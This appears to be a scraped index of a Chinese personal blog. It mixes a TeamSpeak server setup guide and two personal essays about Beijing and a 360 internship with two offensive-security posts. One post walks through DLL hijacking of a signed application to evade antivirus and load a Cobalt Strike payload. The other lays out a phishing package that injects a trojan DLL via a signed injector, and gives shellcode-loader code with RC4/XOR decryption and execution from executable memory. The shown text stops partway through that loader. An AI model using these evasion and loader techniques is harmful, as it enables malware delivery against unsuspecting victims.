切换teamspeak用户，进入teamspeak创建同意用户协议的授权文件\n1 2 3 su teamspeak cd teamspeak touch .ts3server_license_accepted 启动ts3服务，第一次启动的信息十分重要，请保存至本地\n1 ./ts3server_startscript.sh start 开放端口 端口开放要求\n端口 协议 使用说明 是否必须 9987 UDP 默认语音服务端口 是 10011 TCP ServerQuery raw 端口 否 10022 TCP ServerQuery SSH 端口(3.3.0 以上版本服务端) 否 10080 TCP WebQuery(HTTP) 否 10443 TCP WebQuery(HTTPS) 否 30033 TCP 文件传输端口（上传每个房间的头像这个端口就必须开） 是 41144 TCP TSDNS服务端口 否 客户端连接至服务器 第一次登录会提示要求权限密钥，填入之前的token的值即可\ntoken只能使用一次，如失效需再次生成，具体生成过程查看互联网\n生成守护进程 设置服务自启动 因为teamspeak本身没有守护程序，所以出了问题你就只能手动重启（包括重启服务器）\n所以我们这里使用systemd来进行程序守护，让我们省的麻烦了\n创建service文件\n1 vi /lib/systemd/system/teamspeak.service 写入以下内容，记得替换teamspeak文件夹路径\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 [Unit] Description=teamspeak After=network.target [Service] User=teamspeak Group=teamspeak Type=forking WorkingDirectory=/home/teamspeak/ PIDFile=/home/teamspeak/ts3server.pid ExecStart=/home/teamspeak/ts3server_startscript.sh start ExecStop=/home/teamspeak/ts3server_startscript.sh stop RestartSec=15 Restart=always [Install] WantedBy=multi-user.target 重启配置，重启服务，开机自启\n1 2 3 systemctl daemon-reload systemctl enable teamspeak.service systemctl restart teamspeak.service 自定义服务器 在客户端用管理员权限即可设置图标、名称、权限组等配置，无需回到服务器端。还可以添加插件、添加机器人，这些就需要在服务器上配置了。\n","permalink":"http://3lizabeth.fun/posts/study/teamspeak3build/","summary":"云服务器搭建 Teamspeak 服务 Teamspeak Teamspeak是我从中学以来就一直使用的多人语音通信工具。相比于YY，其轻便简洁；相比于kook（盗版discord","title":"云服务器上搭建Teamspeak语音服务"},{"content":"批话 ","permalink":"http://3lizabeth.fun/posts/chonglang/pihua_1/","summary":"批话","title":"批话记录"},{"content":"白加黑 DLL 劫持免杀 认识 DLL劫持，顾名思义，即对正常运行的无害程序的DLL调用进行劫持，使其调用了黑客设置的非法的、有害的DLL库，从而执行恶意代码。该类无害程序大多本身是有正规的文件签名与证书的，因此会被许多杀毒软件列为白名单，对其一些敏感的操作会进行规避。如果对白名单内的程序进行DLL劫持，将其替换为自己的payload，往往可以实现恶意代码的免杀。\n程序调用DLL有一个大致的优先级，大致为\n程序根目录 系统目录（如system32） 16位系统目录 Windows目录 当前工作目录 环境变量PATH中的目录 如果优于原本的DLL伪造了一个DLL，那么程序在尝试加载DLL时，会优先载入恶意DLL，从而执行恶意代码。\n白名单程序 白名单程序是十分好找的，只不过随着越来越多的开发者对安全的重视变得更强，程序在调用 dll 时会进行校验。所以对于白名单程序，须探明其是否有 dll 的完整性校验。但其实还是有很多的常见的白名单程序没有引入完整性校验的。\n删去对应的dll，再检查能否正常启动应用，即可简单地判断是否进行了对该dll的调用。\n而为了测试其是否检测了dll的完整性就有点麻烦了，一般是做完之后才能检测。。\n使用工具 ProcessMonitor： 微软提供的Sysinternals套件的一部分。可以监控和显示操作系统中关于文件系统、注册表、进程、线程和DLL活动的详细实时信息。在本次实验中，Process Monitor可以被用来追踪哪些程序正在尝试加载哪些DLL。即可下载，直接谷歌在官网即可下载。 Aheadlib： 典中典DLL劫持领域中的最常见工具。可以利用该工具用于生成代理DLL，然后替换至对应目录即可实现DLL劫持。这里我使用的是GitHub上使用较广的版本https://github.com/Yonsm/AheadLib VisualStudio 2022：现在许多重写版的Aheadlib都是基于VisualStudio2022来开发的，为了更好地生成出稳定的dll，最好使用该编译器进行dll生成。 DLL 劫持 - 即时调用函数 dll劫持的实操其实比较麻烦，而且寻找不会做检验的应用也比较靠运气，当然有很多现成的已知的可以劫持的应用程序。我这里实操使用雷神加速器进行。\n1.寻找调用dll 可以看到雷神加速器目录下有ffmpeg.dll，应该是团队开发时基于ffmpeg魔改的dll。如果删去该dll，运行leigod.exe时，会产生报错\n那么可知雷神加速器启动时就会调用ffmpeg.exe。那么就可以通过劫持该dll，在虚假的dll中写入自己的恶意代码，在运行启动leigod.exe时就会调用它，从而实现代码执行或远控。\n2.构造恶意dll 使用Ahead进行构造，参数如下\n这里填写大致如上，选择即时调用函数，其dll劫持方法与直接转发大有不同，且听后文分解。\n得到输出的cpp后，将其代码内容全部复制至visual studio中。vs这边需要先创建一个dll项目，然后将代码复制到dllmain即可\n如果有提示形参不兼容等报错，可以在项目处修改字符集为多字节字符集。等会生成方法使用Release，所以需要修改Release的配置。注意这里的原始dll，待会会用到。\nbug问题 我使用的Aheadlib生成的cpp疑似有点bug，也可能是我vs的配置问题。\n生成出来的cpp在链接函数时，是从0开始链接\n询问gpt后得知好像不能从0开始（在Windows上）\n所以把第一行删去即可\n即删去#pragma comment(linker, \u0026quot;/EXPORT:Noname0=_AheadLib_Noname0,@0,NONAME\u0026quot;)这一行\n删去后，就可以构造自己的恶意代码了。\n在dll的入口函数处添加即可，我这里简单弹个计算器。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 // 入口函数 BOOL WINAPI DllMain(HMODULE hModule, DWORD dwReason, PVOID pvReserved) { STARTUPINFO si = { sizeof(si) }; PROCESS_INFORMATION pi; CreateProcess(TEXT(\u0026#34;C:\\\\Windows\\\\System32\\\\calc.exe\u0026#34;), NULL, NULL, NULL, false, 0, NULL, NULL, \u0026amp;si, \u0026amp;pi); if (dwReason == DLL_PROCESS_ATTACH) { DisableThreadLibraryCalls(hModule); return Load(); } else if (dwReason == DLL_PROCESS_DETACH) { Free(); } return TRUE; } 然后生成出最终dll即可。选择Release x86，但具体是x86还是x64需要根据原先dll的具体信息来选择。\n3.更名劫持dll 得到的dll改名为ffmpeg.dll，将其复制到雷神加速器leigod.exe的同目录下。同时还需要将原始的ffmpeg.dll更名为ffmpegOrg.dll（即之前的原始dll名）一同复制，然后再运行。\n可以看到成功弹出了计算器\n但是由于雷神加速器自身开发的机制，检测到被修改后的dll后，会进行一次自我修复，然后ffmpeg就被替换了（可以对比前后两次ffmpeg.dll的大小）\n但这也总比直接禁用好，好歹调用了一次dll执行了代码。\n而potplayer就会检测dll完整性，如果检测到dll被修改则直接取消调用，代码也无法执行了。\n4.简化打包 测试完毕后，如果该app检测出dll被修改后不会强行停用，就可以将该app简化打包了。\n将其主要文件放在独立的文件夹里，查看是否能成功运行恶意代码\n如此，只需要将恶意代码修改为cs服务器的payload并加载，就可以上线了。\n已知白文件汇总 可以通过此网站来查看已挖掘到的Dll：https://hijacklibs.net/\n","permalink":"http://3lizabeth.fun/posts/study/dll_hijacking/","summary":"白加黑 DLL 劫持免杀 认识 DLL劫持，顾名思义，即对正常运行的无害程序的DLL调用进行劫持，使其调用了黑客设置的非法的、有害的DLL库，从而执行恶","title":"白加黑免杀 -- DLL劫持"},{"content":"我在北京 北京是一个冰冷的城市，但我明明是六月末下的火车。分明没下火车我便已经发现了冷意，火车上北京枪射出的子弹打在农枪民工身上，打在了我的身上。穿透灵魂的声波，也穿透了上铺的我的被褥，穿透进了我的耳朵。\n下了火车，进入地铁，两次辗转，又走了长长的一段路，终于是升到了地表，我很激动地拍起了照。可是眼前的景象俨然一副普通小县城的破败样，无非是多了几栋光鲜亮丽的高楼，尖锐湿疣般点缀在其中，对面条街便是枯矮的低楼。然而我当时的确没想到这些，脑子里都是诸如“古城“、”文化”、“历史”之类的词了。跌跌撞撞又等来了网约车，坐在网约车里，依旧是撩人的冷寂，空调与其比都逊色一番。这便是北京么。\n那天我刚到屋内就放下东西歇息了会，然后径直出门骑车遛弯去了。周边尽是公园、小河，绿化极多。傍晚时两周多是遛狗的，散步的与带孩，玩耍的。后边收拾东西，打点出租屋花了些时间，待到终于忙完已是八点，我打开饿了么正要点些什么，却发现方圆也无甚特色，最近已经超出三公里，最便宜也到二十好几去了。\n第二天我就提前去公司门口走了走，主要是熟悉路线与时间。周末的酒仙桥几乎没什么人流，所至之处我也并未感受出与外地的差异，倒是随地可见的白领与贵妇，和那悦耳又令我不安的北京口音，着实添了几分乐趣。那天正是周末，许多家长开着车接着小孩到板场，到琴行。有穿着紧身裙太阳帽墨镜，从车里排排出来的少妇，四五个搭背儿，向参天的酒店大楼慢悠悠地走去。\n还是坐车回屋了。比起相对繁华的酒仙桥，我这的确算是乡下地区了。还小时，玩GTA我特别害怕任务做完后被遗留在海滩处。那里偏远，近景枯燥，了无人烟，店铺关门，远处摩天大楼好像海市蜃楼般矗立，可望不可及。只能徒步跑回城市区，而角色无力的奔跑在这巨大的尺度下犹如昆虫爬行般让我焦躁不安。如今我所住的屋，不正是以前游戏里的沙滩么。\n此后我便再没有个人意志下的的出门了，除了上下班通勤，从家到酒仙桥，从家到东城区，无非是来回辗转，所见风景，唯有漆黑的地铁隧道了，哪有甚么高架与穿楼，这又不是重庆……\n只有两次有事出门，我又来回了两次，有繁华区，有偏远区。我从不觉得夸张的建筑和夺人眼球的设计能成为繁华的标志，但熙熙攘攘的白领与提着公文包的西装人倒让我有些喘不过气来。xx大厦下，戒严的站岗的，好像皇家宫殿前的石狮子，我甚至不敢多看两眼，就匆匆步过了。\n北京的地铁也是冰冷的。有听闻在地铁上吃奶片被乘务劝阻的，如此这般，真的有必要么。我在网上看到许多嘲笑莫斯科、伦敦、巴黎地铁老旧破烂的，他们可知这些地铁的历史有多久远么，或许那时他们的奶奶都还没出生呢。就我个人而言，我认为北京老地铁也多少有点“老旧”和“破烂”了。倒不是说它年老失修，疏于维缮，只是觉得与新地铁站差得有些大了。就像老教室的墙壁、课桌那般，多少有些年代感了。瓷砖墙体覆着不知是什么的粘状物，灰黄花斑点缀的地砖，总觉不再符合年代审美了。站外看得历史也才五十多年，这般不经造么。老地铁有些地方还没有电动扶梯，灯光或许也有些昏暗，颇有一种在玩冷战主题的游戏关卡，在地下通道里寻找出路的既视感。总归别的我也记不太清了，好在是不影响体验。\n要离开北京前几天，我去北京最中心溜了溜。\n无非是震撼与自豪。但很快我又“清醒”，这般震撼与伟大与我有何干系呢？隔两里路几条街，我甚至拍照不能，自我管理之下，对门口写着中国xx楼的建筑，我于是偏头瞅两眼的勇气也丧失了；为了能贴眼看看伟人，我还得三番两次查看预约与安检。第一次进广场时走错了路，进了场西的胡同里了。我纳闷怎么这条街步行时不时还得管制呢，二十米一隔，不停地看见黑白蓝绿衣服的叔叔们，直到我打开了地图，瞧见了场西的大蓝色湖泊标识才恍然大悟。\n后来才知道那天在开会，于是我就心安理得了。虽说那天烈日炎炎，但我却只感到了和伟人对视时的温暖。但运气不好，那天是周一，没有机会能亲自瞻仰了。\n我在北京，倒也没觉得有什么不同。不同家庭、、生活、阶层之间的差距，至少在我的有限的观测之内，没有体会出来。（除了制服带来的威压）我想，我们不都是普通人吗。话虽如此，但这种感想就像烈酒般，吹嘘下肚之后的眩晕感永远是悄无声息延后来至的，谁都不知道几年后，人会变什么样，不知我再看到这篇文章后，又会有哪番别样的体会呢。\n幸福是比例的幸福，有时候人见识的幸福多了，但得到的幸福却无见增，那人肯定会变得不再幸福。如此北京之行，我着实是体会和见识到了许多，但谁又知道我得到的是否更多呢，这都留与时间说去罢。\n","permalink":"http://3lizabeth.fun/posts/articles/%E6%88%91%E5%9C%A8%E5%8C%97%E4%BA%AC/","summary":"我在北京 北京是一个冰冷的城市，但我明明是六月末下的火车。分明没下火车我便已经发现了冷意，火车上北京枪射出的子弹打在农枪民工身上，打在了我的身","title":"我在北京"},{"content":"第一章 憧憬和忧虑 即便是进入了网宿，我依旧没能平复心中的忧虑。各个平台总传出熟悉的厂的岗位的面经，看久了难免难平心中涟漪。于是我继续投，用着在网宿改良的简历，不停地投。突然就接到了360的笔试，北京渗透测试实习生编号4309。这是我第一次面“大厂”，心中自有激动，可是我仍就是像往常的我，心是激动，而行动却不激动：我几乎没有准备地就面试了。那天没去公司，天下着大雨，我在桑梓度过了面试。很快又是二面，二面比一面短了很多，而且面试官似乎比我还敷衍，草草问了几个问题就面完了。如是几天过后再无音讯，我以为已经结束，但又抱着试试的心态再次投递了杭州的渗透测试岗。约好了一面，可没想到一面进去确是HR面，问了一些规划问题就结束。我纳闷怎么一面就是面试，或许是延续之前的一二面吧我想。又没过几天，在公司接到了HR电话，询问入职时间与待遇补贴，我才后知后觉地发现自己已经通过了流程了。一天周五下午上完了最后一节课，在寝室突然收到邮件，这才收到正式offer了。我表面毫无波澜，其实早已高兴地忘形。拿着滑板，去南门玩去了。接下来就是大喇叭昭告天下，可是不免也有些不满，无非是工资太低了，又有些忧虑，无非是一人去外地实习了，还有些犹豫，无非是决定去不去。\n期间我又投，又收到了重庆绿盟offer，此刻时间也接近了，我必须尽早做出抉择，放假是回家就近去绿盟，还是去遥远的北京，抑或是继续呆在网宿。我犹豫了好久，就像我拖延作业、学习一般，直到临近十天我才做出选择，买好了前往北京的单程票。\n我不免开始想象在北京的生活。我不止一次想起了猫和老鼠里风车车独自前往曼哈顿的情形。万般憧憬，最后鼠窜回家。我能否适应下北京的生活吗，我不知道，但是不论如何，我已经没有回头路了。27号和室友出去吃了一顿海鲜自助，晚上回到寝室就开始收拾行李，28号一大早六点，就踏出了寝室门。我买的是绿皮硬卧，时长32小时。第一天除了下床吃中饭与晚上最后一次上厕所，我没有下过床。待到第二天早上上厕所洗脸时，我突然发现自己的脸变得莫名沧桑了——这是我么。连接处我和一位大叔无言抽着烟，望着窗外缓缓离去的风景，烟雾不知不觉笼罩住了我们俩。火车上我就第一次感受到了北京的刻薄，北京口音好像从高处俯冲的鹰，一划拉就给对面中原口音的兔擒住了嘴。\n我带着三包行李与滑板，转了两站地铁，打了车来到小区，安顿好了行李。此刻已经快要傍晚，我打算去出外面溜达溜达。我这才发现我好像是生活在了某个景区里，到处都是草坪，到处都是小河，到处都有小孩，到处都有老人，到处都有下班的人与狗。这会是我的生活吗，我这样想，时间会给我答案的吧。\n第二章 酒仙桥 入职那天闹钟没响，我便自然醒了；前一天我就提前去过一趟公司大楼，于是那天就准点参加了入职宣讲。宣讲结束了，我仍然不知道我的对接人，我甚至只能打电话问HR，这才下来另一位实习生接我入座。\n入职的第一周，我便觉得怪异。我接触的人都是实习生，几乎没有正式工与我打过交道。那一周也没有任何与我相干的事，甚至其他实习生开会也都没有叫上我。我得知他们都是最近入职，或许是专干护网的，与我有所不同吧，我这样安慰。我几乎每一天都无所事事地度过，自己捣鼓自己的事，毕竟也没人来过问。我有些乏味了，虽然心里有些因不受重视而带来的低落，但毕竟作息规律，朝九晚六，我很快就适应起来。可下班的我仍旧有些惆怅与茫然，这不会就是实习的全部了吧。\n第二周周一，我刚跟朋友在微信上说完“完全没事干，等着护网入场摘棉花”，就来人领着我去见了导师。我一眼就认出了导师就是我一面的面试官。与此同时还有另外两名实习生也一同来到，都几乎是刚入职。那中午导师拉着我们进了群，我才终于有了一种归属感。\n导师也才研究生毕业三年，说话大大方方，似乎是少见实习生于是兴致勃勃；我们四人一块去公司食堂吃了午饭，聊了许多工作上的事。这种四人聚堆给了我很大的舒适感，饭后下楼，我刚要递烟，没想到倒是导师先递了出来；接着就是散步聊天。那天下午虽说没事，但是仍然安排了小活，我这才知道即便是考了勤，也是要根据工时打卡算薪的。第二天便分配出来了一个银行的渗透，实习生都和他们一块参与。我有了对工作的热情与干劲，那周每天上班我都带着些许对新一天的期待和向往，下班也是叼着烟，迈着大步，心里洋溢着轻快。\n第三章 东城区 我一直以为我们仨是不用参加护网的，至少也不是纯苦力，在至少参与护网没这么累。可是直到时间给了我闷头一棒，我才发现自己全错了。\n我三四月的时候还对护网充满着憧憬，对这种国家级的项目莫名的向往，可是逐渐了解到蓝初做的事后，我便变了样，护网的印象从新奇、宏大变得枯燥、冷血。\n护网开始后，世界就崩塌了。\n第一周就给我排了六天的夜班，十二小时。我不知道那周我是如何撑过去的，我只记得我的热情，我的天真，跟凌晨的东城区一样，被一望无际的黑埋没掉了。\n每天拖着疲惫的身躯从床上爬起，在沙丁鱼罐头里遭受浸泡，从地铁里探出头来，进入国企与行政森林，我终究不是其中的一份子，我只是被拴在链子里狗，被趋势被叫唤。上头不会叫你名，他们只会叫你的编号，好像你的名字已经丧失了意义。昼夜交替，我突然发现有两天的步数居然一模一样，重复的生活，无趣的生活，竟然通过这种方式给我带来了一丝趣味。\n我坐在工位上除了排遗与进食，一刻不曾离去。十二个小时的煎熬，或许只有流水线上的工人能够理解。但我这算煎熬么。我只是盯着屏幕，不知道何时会蹦出告警，只需简单的复制粘贴截图上报而已，蓝初猴都是如此，有技术含量么。但我还能有自我意识，我能低下头滑屏，我还能打开动画。但不论如何，这已经不是我想象中的实习了。\n隔三岔五的告警，像清晨不时转起的装修钻头，像一班一班咆哮着钻过的地铁，像刺激气体压抑着犹太人的睡眠。我或许能做自己的，能玩自己的，能学自己的，但我不想要把自己的暑期，全部浇筑进注定倒塌的楼的墙里。\n另外两名实习生早早地回到了公司，享受朝九晚六的生活；而我却得排着五天十二小时的班，昼夜颠倒。我不甘。但我也没得选择。我于是快要退缩了，我想过回家，回校，我也有再投递与面试。可是终究事与愿违，似乎没有更好的路能走了。\n我不知道我是如何坚持过来的，我更不知道该如何继续坚持下去。于是我辞职了。没有挽留，也没有我想象的那种惊讶——只是因为突然扰乱了他们的排班而带来的惊讶。自责么，害羞么，那我还真是贱啊。\n简单总结下来，我在360也并非完全没学到东西，无非是涨了许多见识。进步是不可量化的，人只要在呼吸，那他就一定在成长。但人并非植物，单纯的呼吸不会让他们征服天空，潜至深海，突破天际。不论我是否突破了单纯呼吸这一步，但我不会后悔我所选择的，即便是没有。\n星辰无穷，这颗若不是自己想要的星星，那或许下一颗便是。\n","permalink":"http://3lizabeth.fun/posts/articles/%E6%88%91%E7%9A%84360%E5%AE%9E%E4%B9%A0/","summary":"第一章 憧憬和忧虑 即便是进入了网宿，我依旧没能平复心中的忧虑。各个平台总传出熟悉的厂的岗位的面经，看久了难免难平心中涟漪。于是我继续投，用着在","title":"我的360实习"},{"content":"DLL 注入式木马 认识 DLL注入即通过注入器向正在运行中的程序注入新的DLL，使其自动调用该DLL从而触发DLL中的功能。DLL被加载到进程后会自动运行DllMain()函数，用户可以把想执行的代码放到DllMain()函数，每当加载DLL时，添加的代码就会自然而然得到执行。利用该特性可修复程序Bug,或向程序添加新功能。正常常见于调试、功能拓展、自动化等；但若注入恶意的DLL则可导致程序执行攻击者的恶意代码。\n本篇文章源自于倾旋大佬对vscode python调试拓展包内含有的两个dll注入器 inject_dll_x86.exe 与inject_dll_amd64.exe的研究。在该拓展中，还自带了该注入器的源代码。该dll注入器已经带有微软三方组件的签名，通过对该dll注入器的研究，可以实现对应用的免签dll注入。\n其实该dll注入器在各种python拓展包中也自带有，比如我的pycharm\n打开路径，在同路径的windows文件夹里可找到源代码inject_dll.cpp\n源代码 inject_dll.cpp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 #include \u0026lt;iostream\u0026gt; #include \u0026lt;windows.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;conio.h\u0026gt; #include \u0026lt;tchar.h\u0026gt; #include \u0026lt;tlhelp32.h\u0026gt; #pragma comment(lib, \u0026#34;kernel32.lib\u0026#34;) #pragma comment(lib, \u0026#34;user32.lib\u0026#34;) // Helper to free data when we leave the scope. class DataToFree { public: HANDLE hProcess; HANDLE snapshotHandle; LPVOID remoteMemoryAddr; int remoteMemorySize; DataToFree(){ this-\u0026gt;hProcess = nullptr; this-\u0026gt;snapshotHandle = nullptr; this-\u0026gt;remoteMemoryAddr = nullptr; this-\u0026gt;remoteMemorySize = 0; } ~DataToFree() { if(this-\u0026gt;hProcess != nullptr){ if(this-\u0026gt;remoteMemoryAddr != nullptr \u0026amp;\u0026amp; this-\u0026gt;remoteMemorySize != 0){ VirtualFreeEx(this-\u0026gt;hProcess, this-\u0026gt;remoteMemoryAddr, this-\u0026gt;remoteMemorySize, MEM_RELEASE); this-\u0026gt;remoteMemoryAddr = nullptr; this-\u0026gt;remoteMemorySize = 0; } CloseHandle(this-\u0026gt;hProcess); this-\u0026gt;hProcess = nullptr; } if(this-\u0026gt;snapshotHandle != nullptr){ CloseHandle(this-\u0026gt;snapshotHandle); this-\u0026gt;snapshotHandle = nullptr; } } }; /** * All we do here is load a dll in a remote program (in a remote thread). * * Arguments must be the pid and the dll name to run. * * i.e.: inject_dll.exe \u0026lt;pid\u0026gt; \u0026lt;dll path\u0026gt; */ int wmain( int argc, wchar_t *argv[ ], wchar_t *envp[ ] ) { std::cout \u0026lt;\u0026lt; \u0026#34;Running executable to inject dll.\u0026#34; \u0026lt;\u0026lt; std::endl; // Helper to clear resources. DataToFree dataToFree; if(argc != 3){ std::cout \u0026lt;\u0026lt; \u0026#34;Expected 2 arguments (pid, dll name).\u0026#34; \u0026lt;\u0026lt; std::endl; return 1; } const int pid = _wtoi(argv[1]); if(pid == 0){ std::cout \u0026lt;\u0026lt; \u0026#34;Invalid pid.\u0026#34; \u0026lt;\u0026lt; std::endl; return 2; } const int MAX_PATH_SIZE_PADDED = MAX_PATH + 1; char dllPath[MAX_PATH_SIZE_PADDED]; memset(\u0026amp;dllPath[0], \u0026#39;\\0\u0026#39;, MAX_PATH_SIZE_PADDED); size_t pathLen = 0; wcstombs_s(\u0026amp;pathLen, dllPath, argv[2], MAX_PATH); const bool inheritable = false; const HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION, inheritable, pid); if(hProcess == nullptr || hProcess == INVALID_HANDLE_VALUE){ std::cout \u0026lt;\u0026lt; \u0026#34;Unable to open process with pid: \u0026#34; \u0026lt;\u0026lt; pid \u0026lt;\u0026lt; \u0026#34;. Error code: \u0026#34; \u0026lt;\u0026lt; GetLastError() \u0026lt;\u0026lt; \u0026#34;.\u0026#34; \u0026lt;\u0026lt; std::endl; return 3; } dataToFree.hProcess = hProcess; std::cout \u0026lt;\u0026lt; \u0026#34;OpenProcess with pid: \u0026#34; \u0026lt;\u0026lt; pid \u0026lt;\u0026lt; std::endl; const LPVOID remoteMemoryAddr = VirtualAllocEx(hProcess, nullptr, MAX_PATH_SIZE_PADDED, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE); if(remoteMemoryAddr == nullptr){ std::cout \u0026lt;\u0026lt; \u0026#34;Error. Unable to allocate memory in pid: \u0026#34; \u0026lt;\u0026lt; pid \u0026lt;\u0026lt; \u0026#34;. Error code: \u0026#34; \u0026lt;\u0026lt; GetLastError() \u0026lt;\u0026lt; \u0026#34;.\u0026#34; \u0026lt;\u0026lt; std::endl; return 4; } dataToFree.remoteMemorySize = MAX_PATH_SIZE_PADDED; dataToFree.remoteMemoryAddr = remoteMemoryAddr; std::cout \u0026lt;\u0026lt; \u0026#34;VirtualAllocEx in pid: \u0026#34; \u0026lt;\u0026lt; pid \u0026lt;\u0026lt; std::endl; const bool written = WriteProcessMemory(hProcess, remoteMemoryAddr, dllPath, pathLen, nullptr); if(!written){ std::cout \u0026lt;\u0026lt; \u0026#34;Error. Unable to write to memory in pid: \u0026#34; \u0026lt;\u0026lt; pid \u0026lt;\u0026lt; \u0026#34;. Error code: \u0026#34; \u0026lt;\u0026lt; GetLastError() \u0026lt;\u0026lt; \u0026#34;.\u0026#34; \u0026lt;\u0026lt; std::endl; return 5; } std::cout \u0026lt;\u0026lt; \u0026#34;WriteProcessMemory in pid: \u0026#34; \u0026lt;\u0026lt; pid \u0026lt;\u0026lt; std::endl; const LPVOID loadLibraryAddress = (LPVOID) GetProcAddress(GetModuleHandle(\u0026#34;kernel32.dll\u0026#34;), \u0026#34;LoadLibraryA\u0026#34;); if(loadLibraryAddress == nullptr){ std::cout \u0026lt;\u0026lt; \u0026#34;Error. Unable to get LoadLibraryA address. Error code: \u0026#34; \u0026lt;\u0026lt; GetLastError() \u0026lt;\u0026lt; \u0026#34;.\u0026#34; \u0026lt;\u0026lt; std::endl; return 6; } std::cout \u0026lt;\u0026lt; \u0026#34;loadLibraryAddress: \u0026#34; \u0026lt;\u0026lt; pid \u0026lt;\u0026lt; std::endl; const HANDLE remoteThread = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE) loadLibraryAddress, remoteMemoryAddr, 0, nullptr); if (remoteThread == nullptr) { std::cout \u0026lt;\u0026lt; \u0026#34;Error. Unable to CreateRemoteThread. Error code: \u0026#34; \u0026lt;\u0026lt; GetLastError() \u0026lt;\u0026lt; \u0026#34;.\u0026#34; \u0026lt;\u0026lt; std::endl; return 7; } // We wait for the load to finish before proceeding to get the function to actually do the attach. std::cout \u0026lt;\u0026lt; \u0026#34;Waiting for LoadLibraryA to complete.\u0026#34; \u0026lt;\u0026lt; std::endl; DWORD result = WaitForSingleObject(remoteThread, 5 * 1000); if(result == WAIT_TIMEOUT) { std::cout \u0026lt;\u0026lt; \u0026#34;WaitForSingleObject(LoadLibraryA thread) timed out.\u0026#34; \u0026lt;\u0026lt; std::endl; return 8; } else if(result == WAIT_FAILED) { std::cout \u0026lt;\u0026lt; \u0026#34;WaitForSingleObject(LoadLibraryA thread) failed. Error code: \u0026#34; \u0026lt;\u0026lt; GetLastError() \u0026lt;\u0026lt; \u0026#34;.\u0026#34; \u0026lt;\u0026lt; std::endl; return 9; } std::cout \u0026lt;\u0026lt; \u0026#34;Ok, finished dll injection.\u0026#34; \u0026lt;\u0026lt; std::endl; return 0; } 代码实现逻辑 主函数wmain接收两个参数 pid 与 dll name ，即注入应用的pid与注入的dll的路径\n运行后，代码将使用OpenProcess打开目标进程，为其分配(VirtualAllocEx)并写入dll路径(WriteProcessMemory)远程内存；然后使用kernel32.dll的LoadLibraryA函数远程加载dll；最后利用CreateRemoteThread创建远程线程，入口即为LoadLibraryA，以加载指定dll，然后等待其运行即可，直至其线程完成，通过WaitForSingleObject等待其结果。其中DataToTree类的析构函数会在程序结束或错误时自动释放所有资源，包括关闭句柄和释放内存。\n注入器使用方式 该注入器使用只需两个参数：\npid : 目标进程的进程ID dll name: 想要注入目标进程的DLL绝对路径 滥用思路 钓鱼的时候可以发送一个BAT批处理脚本、dll注入器、dll木马 BAT批处理：获取x64进程的pid BAT批处理：获取dll木马绝对路径 BAT批处理：执行dll注入器，将dll木马注入到目标进程中 构造如图所示的压缩包，解压后得到钓鱼木马文件： 编写dll木马 为了使恶意dll注入进了目标进程后能自动被调用，则将恶意代码写入dllmain中。\n思路是在入口点执行函数，申请一个新线程，然后启动木马函数，进行shellcode的解密与加载，然后有序关闭句柄并清理资源。\ndllmain.cpp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 #include \u0026#34;pch.h\u0026#34; #include \u0026lt;windows.h\u0026gt; #include \u0026lt;iostream\u0026gt; #include \u0026lt;fstream\u0026gt; #include \u0026lt;cstring\u0026gt; // 静态变量和句柄 static HANDLE hThread = NULL; static HANDLE hFile = INVALID_HANDLE_VALUE; const char* SHELLCODE_FILE = \u0026#34;p64e.bin\u0026#34;; const char* RC4_KEY = \u0026#34;iC4n7\u0026#39;tHelpmYSe1f14ugh1n9\u0026#34;; const char* XOR_KEY = \u0026#34;411oFusd0n\u0026#39;tKn0wWh4t\u0026#39;sG01n90n!\u0026#34;; // RC4解密 char* spellRC4(char* spell, int spellLength) { unsigned char S[256]; int i, j, x, y, t; char* ciphertext = new char[spellLength]; for (i = 0; i \u0026lt; 256; i++) { S[i] = i; } j = 0; for (i = 0; i \u0026lt; 256; i++) { j = (j + S[i] + RC4_KEY[i % strlen(RC4_KEY)]) % 256; std::swap(S[i], S[j]); } x = 0; y = 0; for (int k = 0; k \u0026lt; spellLength; k++) { x = (x + 1) % 256; y = (y + S[x]) % 256; std::swap(S[x], S[y]); t = (S[x] + S[y]) % 256; ciphertext[k] = spell[k] ^ S[t]; } return ciphertext; } // XOR解密 char* spellXOR(char* spell, int spellLength) { int keyLength = strlen(XOR_KEY); for (int i = 0; i \u0026lt; spellLength; ++i) { spell[i] = spell[i] ^ XOR_KEY[i % keyLength]; } return spell; } // 解密和执行函数 void cast_spell_3(char* spell, int spellSize) { DWORD dwOldProtect; HANDLE HeapHandle = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, spellSize, 0); char* buf = (char*)HeapAlloc(HeapHandle, HEAP_ZERO_MEMORY, spellSize); //堆调用 memcpy(buf, spell, spellSize); VirtualProtect(buf, spellSize, PAGE_EXECUTE, \u0026amp;dwOldProtect); HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)buf, NULL, 0, NULL); WaitForSingleObject(hThread, INFINITE); } // DLL导出函数，读取、解密和执行shellcode extern \u0026#34;C\u0026#34; __declspec(dllexport) void RunShellcode() { std::ifstream spellfile(SHELLCODE_FILE, std::ios::in | 